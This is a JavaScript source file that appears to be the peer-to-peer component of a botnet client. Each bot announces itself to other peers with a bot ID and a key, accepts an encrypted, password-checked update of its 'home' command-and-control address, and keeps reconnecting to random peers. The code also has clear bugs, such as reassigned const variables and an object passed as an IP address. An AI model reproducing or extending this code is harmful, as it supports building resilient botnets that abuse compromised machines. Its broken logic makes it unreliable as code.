'use strict';

const assert = require('assert');
const sjcl = require('./sjcl');
const Utils = require('./utils');
const Connection = require('./connection_new');
const DB = require('./db');
const config = require('./config');
const net = require('net');


let connectedPeer = null;
let homeUpdateCb = null;
let homeAddr = null;


class Peer extends Connection {
  constructor(sock) {
    super(sock);
    this._deathTimeout = setTimeout(() => {
      this.die();
    }, 5 * 60 * 1000);
    this._onConnect();
  }

  _onConnect() {
    const homeAddr = DB.getHomeAddr();
    if (!homeAddr) {
      homeAddr = {};
    }
    const ID = DB.readID();
    const pass = DB.readPass();
    const msg = {
      type: 'helloFromBot',
      botID: ID,
      key: Utils.makeid(20),
      homeAddr
    };
    console.log(msg);
    this.sendMsg(msg, (err, resp) => {
      if (err) {
	console.log(err);
	return;
      }
      console.log(resp);
      const encrypted = resp.data;
      let data = sjcl.decrypt(msg.key, encrypted);
      try {
	data = JSON.parse(data);
      } catch (e) {
	console.log(e);
	console.log('eminem');
	return;
      }
      console.log(data);	
      if (data.pass !== pass) {
	console.log('invalid pass: %s !== %s', data.pass, pass);
	process.exit(0);
      }
      console.log('changing home address');
      console.log(data.homeAddr);
      const ip = data.homeAddr.ip;
      const port = data.homeAddr.port;
      assert(ip);
      assert(port);
      // todo
      DB.storeHomeAddr({
	ip: ip,
	port: port
      });
      process.exit(0);
      // todo
    });
  }



  died() {
    if (!this.isAlive()) {
      return;
    }
    super.died();
    clearTimeout(this._deathTimeout);
  }


};

function connect(ip, port) {
  const sock = net.connect(port, ip, () => {
    console.log('done');
    sock.removeListener('close', onCanNotConnect);
    sock.removeListener('timeout', onTimeoutBeforeConnct);

    connectedPeer = new Peer(sock);
    connectedPeer.setKeepAlive(5 * 60);

    sock.on('close', () => {
      console.log('closed. bitch');
      connectedPeer = null;
      setTimeout(() => {
        connectRandomPeer();
      }, 1000);
    });

  });
  sock.on('close', onCanNotConnect)  ;
  sock.on('error', err => console.log);
  sock.setTimeout(10 * 1000, onTimeoutBeforeConnct);
  function onCanNotConnect() {
    console.log('can not connect');    
    setTimeout(() => {
      connectRandomPeer();
    }, 1000);
  }

  function onTimeoutBeforeConnct() {
    sock.destroy();
  }

}

function connectRandomPeer() {
  const peerAddr = DB.getRandomPeer();
  if (!peerAddr) {
    // todo
    peerAddr = {
      ip: 'localhost',
      port: '80'
    };
  }
  console.log('connecting to random peer');
  const ip = peerAddr;
  const port = config.botListener.port;
  console.log('ip: %s, port: %s', ip, port);
  connect(ip, port);
}

function init() {
  connectRandomPeer();
}

function onHomeUpdate(cb) {
  homeUpdateCb = cb;
}

module.exports.onHomeUpdate = onHomeUpdate;
module.exports.init = init;
